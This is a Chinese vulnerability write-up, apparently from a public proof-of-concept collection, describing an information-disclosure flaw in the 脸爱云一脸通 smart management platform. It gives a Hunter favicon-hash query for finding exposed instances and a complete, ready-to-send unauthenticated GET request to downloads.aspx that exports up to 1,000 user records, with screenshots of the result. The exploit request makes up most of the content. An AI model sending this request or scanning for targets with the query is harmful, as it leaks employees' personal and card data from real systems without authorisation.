# 脸爱云一脸通智慧管理平台downloads存在信息泄露漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台downloads存在信息泄露漏洞。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 脸爱云一脸通智慧管理平台

# 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征

![1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28.png](./img/oYOAbyeNxy0-K3kx/1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28-421332.png)

# 四、漏洞复现
```java
GET /downloads.aspx?Ename=UserInfo&total=1000&jsonParam={%22rybh%22:%22%22,%22ryxm%22:%22%22,%22EngName%22:%22%22,%22groupname%22:%22%22,%22companyname%22:%22%22,%22bmmc%22:%22%22,%22ryzt%22:%22%22,%22rzstartime%22:%22%22,%22rzendtime%22:%22%22,%22lzstartime%22:%22%22,%22lzendtime%22:%22%22,%22zhiwu%22:%22%22,%22cardid%22:%22%22,%22rfzt%22:%22%22,%22klb%22:%22%22,%22sxstartime%22:%22%22,%22sxendtime%22:%22%22,%22khstartime%22:%22%22,%22khendtime%22:%22%22,%22rfoperator%22:%22%22,%22rfstartime%22:%22%22,%22rfendtime%22:%22%22,%22feat%22:%22%22} HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![1714289513778-bfcc1b6d-0d32-422d-90f6-64868d76dc93.png](./img/oYOAbyeNxy0-K3kx/1714289513778-bfcc1b6d-0d32-422d-90f6-64868d76dc93-068062.png)

![1714289539725-6727a5dd-f8c7-49a6-9297-493ce0cdb52d.png](./img/oYOAbyeNxy0-K3kx/1714289539725-6727a5dd-f8c7-49a6-9297-493ce0cdb52d-931943.png)



> 更新: 2024-04-28 15:34:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lim8z4ebk4m2ztoh>